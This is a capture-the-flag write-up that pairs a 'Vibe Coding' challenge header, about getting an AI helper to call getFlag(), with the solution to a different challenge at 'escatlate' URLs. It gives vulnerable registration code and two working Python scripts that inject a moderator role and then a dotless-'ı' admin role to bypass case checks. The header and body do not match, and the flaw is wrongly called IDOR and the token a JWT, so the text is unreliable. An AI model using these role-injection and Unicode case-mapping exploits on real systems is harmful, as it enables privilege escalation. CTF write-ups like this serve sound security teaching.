## Challenge

**Title**
WEB/MISC // 👴🏻 Vibe Coding

**Description**
Turns out this is the way to go. AI codin' when you vibin'. Can you ask Zenek to call getFlag() function for you?
🔗 https://vibe-coding-4659ccfb9951.1753ctf.com

## Solution (Flag 1)

I exploited a simple IDOR vulnerability during user registration, which allowed me to inject a role into the request.

The code responsible for the vulnerability that allows role injection:
```javascript
app.post('/api/register', (req, res) => {

    const existingUser = users.find(u => u.username == req.body.username);
    if(existingUser)
        return res.status(400).send('User already exists');

    if(req.body.role?.toLowerCase() == 'admin')
        return res.status(400).send('Invalid role');

    const user = {
        username: req.body.username.substring(0, 20),
        password: req.body.password.substring(0, 20),
        token: crypto.randomBytes(32).toString('hex'),
        role: req.body.role.substring(0, 20) || 'user'
    }

    users.push(user);

    res.json(user);
})
```

The code that allows us to obtain the flag:
``` javascript
app.get('/api/message', (req, res) => {
    if(req.user.role.toUpperCase() === 'ADMIN')
        return res.json({ message: `Hi Admin! Your flag is ${process.env.ADMIN_FLAG}` });
    
    if(req.user.role.toUpperCase() === 'MODERATOR')
        return res.json({ message: `Hi Mod! Your flag is ${process.env.MODERATOR_FLAG}` });

    res.json({ message: `Hello ${req.user.username}` });
})
```

Authentication works as a middleware by passing x-token http header:

```javascript
app.use((req, res, next) => {
    const token = req.headers["x-token"];
    const user = users.find(u => u.token == token);

    if(!user)
        return res.status(401).send('Unauthorized');

    req.user = user;
    next();
})
```

I used the following Python script to automate the exploitation process:

- Register a new user with a known password (password123) and role moderator.
- If registration succeeds, extract the JWT token from the response.
- Use the token to access a protected endpoint and retrieve the flag.

```python
import requests
import random
import string

def generate_username(prefix="user", length=6):
    suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    return f"{prefix}_{suffix}"
    
username = generate_username()
password = "password123"

print(f"User {username}:{password}")

# Register contants
url_register = "https://escatlate-52bc47e034fa.1753ctf.com/api/register"
register_payload = {
    "username": username,
    "password": password,
    "role": "moderator"
}

headers_register = {
    "Content-Type": "application/json",
}

# Send register request
response = requests.post(url_register, json=register_payload, headers=headers_register)
response_data = response.json()

# Get token from response
token = response_data.get("token")
print(f"Token: {token}")

# If getting token is succed get a flag
if token:
    url_message = "https://escatlate-52bc47e034fa.1753ctf.com/api/message"
    headers_message = {
        "X-Token": token
    }

    response_msg = requests.get(url_message, headers=headers_message)
    print("Response from: /api/message:")
    print(response_msg.text)
else:
    print("[Error] No token provided.")

```

## Solution (Flag 2)

To get the second flag, we need to log in as an admin, but this is complicated by the following code during registration:

```javascript
    if(req.body.role?.toLowerCase() == 'admin')
        return res.status(400).send('Invalid role');
```

Another important piece of code is the one responsible for role verification when attempting to retrieve the message:

```javascript
    if(req.user.role.toUpperCase() === 'ADMIN')
        return res.json({ message: `Hi Admin! Your flag is ${process.env.ADMIN_FLAG}` });
```

I used the dotless 'ı' character to bypass these validations (https://www.ascii-code.com/character/%C4%B1). The role name I sent was "adm\u0131n". This allowed me to bypass the comparison with "admin" after applying the toLowerCase function. However, at the same time, the second validation, which used the toUpperCase function, converted the character to a regular 'I', and the comparison with "ADMIN" succeeded.

Here’s the exploit:

```python
import requests
import random
import string

def generate_username(prefix="user", length=6):
    suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    return f"{prefix}_{suffix}"
    
username = generate_username()
password = "password123"

print(f"User {username}:{password}")

# Register contants
url_register = "https://escatlate-52bc47e034fa.1753ctf.com/api/register"
register_payload = {
    "username": username,
    "password": password,
    "role": "adm\u0131n"
}

headers_register = {
    "Content-Type": "application/json",
}

# Send register request
response = requests.post(url_register, json=register_payload, headers=headers_register)
response_data = response.json()

# Get token from response
token = response_data.get("token")
print(f"Token: {token}")

# If getting token is succed get a flag
if token:
    url_message = "https://escatlate-52bc47e034fa.1753ctf.com/api/message"
    headers_message = {
        "X-Token": token
    }

    response_msg = requests.get(url_message, headers=headers_message)
    print("Response from: /api/message:")
    print(response_msg.text)
else:
    print("[Error] No token provided.")

```